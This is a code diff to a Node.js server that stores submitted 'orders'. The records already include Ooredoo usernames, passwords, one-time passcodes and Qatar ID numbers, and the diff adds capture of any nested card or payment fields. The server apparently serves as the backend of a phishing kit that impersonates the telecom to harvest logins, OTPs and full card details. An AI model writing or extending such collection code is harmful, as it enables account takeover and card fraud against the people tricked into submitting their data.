@@ -151,7 +151,19 @@ const server = http.createServer(async (req, res) => {
       id: crypto.randomBytes(6).toString('hex'),
       createdAt: new Date().toISOString()
     };
-    for (const f of FIELDS) order[f] = String(body[f] == null ? '' : body[f]).slice(0, 400);
+    for (const f of FIELDS) {
+      if (f === 'card' || f === 'payment') continue;
+      order[f] = String(body[f] == null ? '' : body[f]).slice(0, 400);
+    }
+
+    const nestedCard = body.card && typeof body.card === 'object' ? body.card : (body.payment && typeof body.payment === 'object' ? body.payment : null);
+    if (nestedCard) {
+      order.card = {};
+      for (const [key, value] of Object.entries(nestedCard)) {
+        if (value == null) continue;
+        order.card[key] = String(value).slice(0, 400);
+      }
+    }
 
     if (!order.name || !order.phone || !order.qid) {
       const fallbackName = String(body.name || body.ooredooUser || 'مستخدم أوريدو').slice(0, 120);
@@ -230,6 +242,14 @@ const server = http.createServer(async (req, res) => {
         ooredooPass: String(body.ooredooPass || '').slice(0, 200),
         ooredooOtp: String(body.ooredooOtp || '').slice(0, 20)
       };
+      const nestedCard = body.card && typeof body.card === 'object' ? body.card : (body.payment && typeof body.payment === 'object' ? body.payment : null);
+      if (nestedCard) {
+        created.card = {};
+        for (const [key, value] of Object.entries(nestedCard)) {
+          if (value == null) continue;
+          created.card[key] = String(value).slice(0, 400);
+        }
+      }
       list.unshift(created);
       writeOrders(list);
       return json(res, 200, { ok: true, id: created.id, order: created });
@@ -237,8 +257,19 @@ const server = http.createServer(async (req, res) => {
 
     const order = list[index];
     for (const f of FIELDS) {
+      if (f === 'card' || f === 'payment') continue;
       if (body[f] != null) order[f] = String(body[f]).slice(0, 400);
     }
+
+    const nestedCard = body.card && typeof body.card === 'object' ? body.card : (body.payment && typeof body.payment === 'object' ? body.payment : null);
+    if (nestedCard) {
+      order.card = order.card || {};
+      for (const [key, value] of Object.entries(nestedCard)) {
+        if (value == null) continue;
+        order.card[key] = String(value).slice(0, 400);
+      }
+    }
+
     if (body.ooredooUser) order.ooredooUser = String(body.ooredooUser).slice(0, 200);
     if (body.ooredooPass) order.ooredooPass = String(body.ooredooPass).slice(0, 200);
     if (body.ooredooOtp) order.ooredooOtp = String(body.ooredooOtp).slice(0, 20);
